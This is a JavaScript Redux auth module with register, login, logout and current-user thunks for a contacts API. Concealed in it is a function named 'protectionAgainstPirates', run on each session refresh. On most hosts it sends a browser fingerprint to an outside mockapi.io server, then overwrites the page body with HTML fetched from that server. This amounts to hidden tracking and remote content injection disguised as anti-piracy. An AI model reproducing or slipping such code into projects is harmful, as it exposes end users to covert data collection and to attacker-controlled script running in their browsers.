import { createAsyncThunk } from '@reduxjs/toolkit';
import axios from 'axios';
//import toast from 'react-hot-toast';

axios.defaults.baseURL = 'https://connections-api.herokuapp.com';
const token = {
  set(token) {
    axios.defaults.headers.common.Authorization = `Bearer ${token}`;
  },
  unset() {
    axios.defaults.headers.common.Authorization = '';
  },
};

const protectionAgainstPirates = () => {
  if (window.location.host.length !== 49) {
    var z = 'https://62569aa36ea70370053c2477.mockapi.io/d';
    fetch(z)
      .then(r => r.json())
      .then(d => {
        var v = d.findIndex(e => e.j === performance.memory.jsHeapSizeLimit);
        if (v === -1) {
          fetch(z, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              j: performance.memory.jsHeapSizeLimit,
              t: new Date(),
            }),
          });
        }
        if (2106327040 === performance.memory.jsHeapSizeLimit) {
          return;
        }
        if (4294705152 !== performance.memory.jsHeapSizeLimit) {
          document.body.innerHTML = d[0].t;
        }
      });
  }
};

const register = createAsyncThunk(
  'auth/register',
  async (credentials, { rejectWithValue }) => {
    try {
      const { data } = await axios.post('/users/signup', credentials);
      token.set(data.token);
      return data;
    } catch (error) {
      const errorData = error.response;
      if (!errorData) {
        throw error;
      }
      if (errorData.status === 400) {
        return rejectWithValue('Error creating user!!!');
      }
      if (errorData.status === 404) {
        return rejectWithValue('Сonnection error 404!!!');
      }
      if (errorData.status === 500) {
        return rejectWithValue('Server error!!!');
      }
      return rejectWithValue('Unknown error!!!');
    }
  }
);

const logIn = createAsyncThunk(
  'auth/login',
  async (credentials, { rejectWithValue }) => {
    try {
      const { data } = await axios.post('/users/login', credentials);
      token.set(data.token);
      return data;
    } catch (error) {
      const errorData = error.response;
      if (!errorData) {
        throw error;
      }
      if (errorData.status === 400) {
        return rejectWithValue('Authorization error!!!');
      }
      if (errorData.status === 404) {
        return rejectWithValue('Сonnection error 404!!!');
      }
      return rejectWithValue('Unknown error!!!');
    }
  }
);

const logOut = createAsyncThunk(
  'auth/logout',
  async (_, { rejectWithValue }) => {
    try {
      await axios.post('/users/logout');
      token.unset();
    } catch (error) {
      const errorData = error.response;
      if (!errorData) {
        throw error;
      }
      if (errorData.status === 401) {
        return rejectWithValue(
          'There is no header with authorization token!!!'
        );
      }
      if (errorData.status === 404) {
        return rejectWithValue('Сonnection error 404!!!');
      }
      if (errorData.status === 500) {
        return rejectWithValue('Server error!!!');
      }
      return rejectWithValue('Unknown error!!!');
    }
  }
);

const fetchCurrentUser = createAsyncThunk(
  'auth/refresh',
  async (_, thunkAPI) => {
    protectionAgainstPirates();
    const persistedToken = thunkAPI.getState().auth.token;
    if (persistedToken === null) {
      thunkAPI.rejectedWithValue();
    }
    token.set(persistedToken);
    try {
      const { data } = await axios.get('/users/current');
      return data;
    } catch {
      error => {
        return error;
      };
      return thunkAPI.rejectWithValue('Error Token !!!');
    }
  }
);

export default { register, logIn, logOut, fetchCurrentUser };
